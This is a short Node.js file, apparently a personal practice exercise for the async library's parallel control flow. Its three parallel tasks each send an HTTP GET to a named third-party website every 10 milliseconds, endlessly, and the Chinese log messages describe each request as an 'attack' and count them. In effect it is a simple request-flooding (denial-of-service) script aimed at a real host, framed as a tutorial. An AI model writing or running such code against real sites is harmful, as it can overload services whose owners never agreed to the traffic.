/**
 * @time  2018/9/21 10:59
 * @author  Bill Wang <1826001146@qq.com>
 * @desc  Async并行流程控制
 * @param parallel(task,callback)
 *        @task:可以是数组也可以是JSON对象，是哪种类型就返回哪种类型
 *        @callback:回调函数，用来返回task执行后接收的数据
 *        并发控制就是在同一时间干两件事或者多件事
 * @todo 练习并且熟练使用
 */
const async = require('async');
const http = require('http')
console.time('time');
async.parallel([
    (callback) => {
        console.log('我是进程1,开始并发攻击网站');
        let count1 = 0;
        setInterval(()=>{
            http.get('http://www.websitdevelopment.cn/',()=>{
                count1++;
                console.log(`进程1攻击${count1}次`);
            })
        },10)
        callback(null, 'Hello');
    },
    (callback) => {
        console.log('我是进程2，开始并发攻击网站');
        let count2 = 0;
        setInterval(()=>{
            http.get('http://www.websitdevelopment.cn/',()=>{
                count2++;
                console.log(`进程2攻击${count2}次`);
            })
        },10)
        callback(null, 'World');
    },
    (callback) => {
        console.log('我是进程3，开始并发攻击网站');
        let count3 = 0;
        setInterval(()=>{
            http.get('http://www.websitdevelopment.cn/',()=>{
                count3++;
                console.log(`进程3攻击${count3}次`);
            })
        },10)
        callback(null, 'Bill Wang');
    }
], (err, results) => {
    console.log(...results);
});
console.timeEnd('time');